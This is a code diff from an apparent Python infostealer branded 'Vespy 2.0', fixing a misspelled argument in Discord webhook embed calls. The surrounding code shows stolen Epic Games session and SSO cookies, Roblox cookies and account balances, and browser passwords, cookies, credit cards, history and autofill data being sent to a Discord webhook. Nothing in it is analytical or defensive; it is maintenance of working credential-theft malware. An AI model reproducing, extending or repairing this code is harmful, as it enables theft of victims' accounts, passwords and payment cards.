@@ -31,7 +31,7 @@ class CookieInfo():
         embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
         embed.set_footer(text='Vespy 2.0 | by : vesper')
         embed.set_timestamp()
-        embed.add_embed_field(name=f"Account of {displayname}\n", value=f":id: ID: ``{ID}``\n\n:dollar: Balance : ``{balance}``\n\n:cookie: EPIC_CLIENT_SESSION : ``{ESC[:20]}.. REST IN COOKIES``\n\n:cookie: EPIC_SSO : ``{ES}``", ineline=False)
+        embed.add_embed_field(name=f"Account of {displayname}\n", value=f":id: ID: ``{ID}``\n\n:dollar: Balance : ``{balance}``\n\n:cookie: EPIC_CLIENT_SESSION : ``{ESC[:20]}.. REST IN COOKIES``\n\n:cookie: EPIC_SSO : ``{ES}``")
         webhook.add_embed(embed)
         webhook.execute()
 
@@ -43,7 +43,7 @@ class CookieInfo():
             embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
             embed.set_footer(text='Vespy 2.0 | by : vesper')
             embed.set_timestamp()
-            embed.add_embed_field(name=f"Account of {r['UserName']}\n", value=f":id: ID: ``{r['UserID']}``\n:dollar: Robux Balance: ``{r['RobuxBalance']}``\n:crown: Premium: ``{r['IsPremium']}``\n\n:cookie: Roblox Cookie: ``{cookie}``\n", ineline=False)
+            embed.add_embed_field(name=f"Account of {r['UserName']}\n", value=f":id: ID: ``{r['UserID']}``\n:dollar: Robux Balance: ``{r['RobuxBalance']}``\n:crown: Premium: ``{r['IsPremium']}``\n\n:cookie: Roblox Cookie: ``{cookie}``\n")
             embed.set_thumbnail(url=r['ThumbnailUrl'])
             webhook.add_embed(embed)
             webhook.execute()
@@ -218,7 +218,7 @@ class Browsers():
         embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
         embed.set_footer(text='Vespy 2.0 | by : vesper')
         embed.set_timestamp()
-        embed.add_embed_field(name=f"All Info From Browsers\n\n", value=f":unlock: Passwords: **{PasswordSite}**\n\n:cookie: Cookies: **{CookieSite}**\n\n:credit_card: CCs: **{CredsSite}**\n\n:page_with_curl: History: **{HistorySite}**\n\n:arrow_down: Downloads: **{DownloadSite}**\n\n:identification_card: Autofill: **{AutofillSite}**\n", ineline=False)
+        embed.add_embed_field(name=f"All Info From Browsers\n\n", value=f":unlock: Passwords: **{PasswordSite}**\n\n:cookie: Cookies: **{CookieSite}**\n\n:credit_card: CCs: **{CredsSite}**\n\n:page_with_curl: History: **{HistorySite}**\n\n:arrow_down: Downloads: **{DownloadSite}**\n\n:identification_card: Autofill: **{AutofillSite}**\n")
         webhook.add_embed(embed)
         webhook.execute()
         try:
